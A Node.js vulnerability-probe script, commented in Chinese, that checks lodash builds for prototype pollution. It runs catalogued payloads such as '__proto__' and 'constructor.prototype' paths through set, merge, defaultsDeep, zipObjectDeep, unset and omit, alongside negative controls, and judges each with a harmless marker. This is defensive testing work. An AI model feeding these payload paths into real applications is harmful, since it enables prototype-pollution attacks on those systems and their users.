#!/usr/bin/env node
/**
 * VHV reify 层的最小原子：把「假设」变成「可执行且可判定的探针」。
 *
 * 两条硬约束（都是被实测打出来的，不是设计洁癖）
 * --------------------------------------------
 * 1) **一个载荷一个进程**：原型链污染是全局副作用。同进程复用会让后一个 case
 *    吃到前一个的残留，把「没打到点」误判成「打到了」。
 *
 * 2) **操作类型决定判据形态**（2026-11-02 踩过）：
 *    - 写入型（set/merge/zipObjectDeep）：判据是「新对象能不能看见这个 marker」
 *    - 删除型（unset/omit）：判据反过来 —— 必须先**预置** marker，再看它**是否消失**。
 *    第一版对所有载荷都用写入判据，结果 `_.unset` 删完之后 marker 当然读不到，
 *    被判成「未污染」。那是判据错，不是漏洞不存在。
 *
 * 判据刻意分开写，不用一个 bool 糊过去：全局污染(Object.prototype)、
 * 本地原型劫持(返回值自身的 proto 变了)、删除成功，三者影响面完全不同。
 *
 * 用法：node probe.js <case名> <lodash绝对路径>
 * 输出：单行 JSON
 */
const path = require('path');

const caseName = process.argv[2];
const lodashPath = process.argv[3] || path.join(__dirname, 'src/lodash-4.18.0/lodash.js');

// kind: 'write' 写入型 / 'delete' 删除型 / 'control' 阴性对照
const CASES = {
  // ===== 写入型：字符串路径 =====
  'set_str_proto': { kind: 'write', fn: (_, m) => _.set({}, `__proto__.${m}`, 1) },
  'set_str_ctor': { kind: 'write', fn: (_, m) => _.set({}, `constructor.prototype.${m}`, 1) },
  'set_str_prototype_only': { kind: 'write', fn: (_, m) => _.set({}, `prototype.${m}`, 1) },

  // ===== 写入型：数组路径（4.17.23 的 bypass 模式）=====
  'set_arr_proto': { kind: 'write', fn: (_, m) => _.set({}, ['__proto__', m], 1) },
  'set_arr_ctor': { kind: 'write', fn: (_, m) => _.set({}, ['constructor', 'prototype', m], 1) },
  'set_arr_proto_num': { kind: 'write', fn: (_, m) => _.set({}, ['__proto__', 0, m], 1) },
  'set_arr_proto_obj': { kind: 'write', fn: (_, m) => _.set({}, ['__proto__', { toString: () => m }], 1) },
  'setWith_proto': { kind: 'write', fn: (_, m) => _.setWith({}, `__proto__.${m}`, 1, Object) },
  'setWith_arr_ctor': { kind: 'write', fn: (_, m) => _.setWith({}, ['constructor', 'prototype', m], 1, Object) },

  // ===== 写入型：merge 家族 =====
  'merge_proto': { kind: 'write', fn: (_, m) => _.merge({}, JSON.parse(`{"__proto__":{"${m}":1}}`)) },
  'merge_ctor': { kind: 'write', fn: (_, m) => _.merge({}, JSON.parse(`{"constructor":{"prototype":{"${m}":1}}}`)) },
  'defaultsDeep_proto': { kind: 'write', fn: (_, m) => _.defaultsDeep({}, JSON.parse(`{"__proto__":{"${m}":1}}`)) },
  'defaultsDeep_ctor': { kind: 'write', fn: (_, m) => _.defaultsDeep({}, JSON.parse(`{"constructor":{"prototype":{"${m}":1}}}`)) },
  'update_proto': { kind: 'write', fn: (_, m) => _.update({}, `__proto__.${m}`, () => 1) },
  'zipObjectDeep_proto': { kind: 'write', fn: (_, m) => _.zipObjectDeep([`__proto__.${m}`], [1]) },
  'zipObjectDeep_ctor': { kind: 'write', fn: (_, m) => _.zipObjectDeep([`constructor.prototype.${m}`], [1]) },

  // ===== 删除型：unset / omit —— 判据是「预置的全局属性是否消失」=====
  // 这是 GHSA-f23m-r3pf-42rh 的落点：4.17.20 的 baseUnset 完全无防护，
  // parent({}, ['__proto__']) 直接给出 Object.prototype，然后 delete。
  'unset_del_proto_str': { kind: 'delete', fn: (_, m) => _.unset({}, `__proto__.${m}`) },
  'unset_del_proto_arr': { kind: 'delete', fn: (_, m) => _.unset({}, ['__proto__', m]) },
  'unset_del_ctor_proto': { kind: 'delete', fn: (_, m) => _.unset({}, ['constructor', 'prototype', m]) },
  'unset_del_prototype_only': { kind: 'delete', fn: (_, m) => _.unset({}, ['prototype', m]) },
  'omit_del_proto_arr': { kind: 'delete', fn: (_, m) => _.omit({}, [['__proto__', m]]) },
  'omit_del_proto_str': { kind: 'delete', fn: (_, m) => _.omit({}, [`__proto__.${m}`]) },

  // ===== 阴性对照：不碰原型，任何一版都绝不该判成污染 =====
  'ctrl_normal_set': { kind: 'control', fn: (_, m) => _.set({}, `a.b.${m}`, 1) },
  'ctrl_normal_merge': { kind: 'control', fn: (_, m) => _.merge({}, JSON.parse(`{"a":{"${m}":1}}`)) },
  'ctrl_normal_unset': { kind: 'control', fn: (_, m) => { const o = { a: { [m]: 1 } }; _.unset(o, ['a', m]); return o; } },
};

function main() {
  const spec = CASES[caseName];
  if (!spec) {
    console.log(JSON.stringify({ case: caseName, ok: false, error: 'unknown case' }));
    process.exit(2);
  }

  const marker = 'vhv_' + caseName + '_' + Math.random().toString(36).slice(2, 8);
  let _;
  try {
    _ = require(lodashPath);
  } catch (e) {
    console.log(JSON.stringify({ case: caseName, ok: false, error: 'load: ' + e.message }));
    process.exit(3);
  }

  // 删除型必须先预置：否则「本来就不存在」和「成功删掉」无法区分
  if (spec.kind === 'delete') {
    Object.defineProperty(Object.prototype, marker, {
      value: 'alive', writable: true, enumerable: false, configurable: true,
    });
  }

  let error = null;
  const t0 = Date.now();
  try {
    spec.fn(_, marker);
  } catch (e) {
    error = e.constructor.name + ': ' + e.message;
  }
  const ms = Date.now() - t0;

  let polluted = false;
  let detail = '';

  try {
    if (spec.kind === 'delete') {
      // 判据：预置的属性还在不在。消失 == 删除成功 == 污染成立
      const stillThere = Object.prototype[marker] !== undefined;
      polluted = !stillThere;
      detail = stillThere ? '预置属性仍在' : '预置属性被删除';
    } else {
      // 判据：全新空对象能不能看见 marker
      polluted = ({}[marker] !== undefined) || (Object.prototype[marker] !== undefined);
      detail = polluted ? '全局可见' : '全局不可见';
    }
  } catch (e) {
    detail = 'judge error: ' + e.message;
  }

  console.log(JSON.stringify({
    case: caseName,
    kind: spec.kind,
    ok: !error,
    lodash_version: _.VERSION,
    marker: marker,
    polluted: polluted,
    detail: detail,
    error: error,
    ms: ms,
  }));

  try { delete Object.prototype[marker]; } catch (e) { /* 忽略 */ }
}

main();
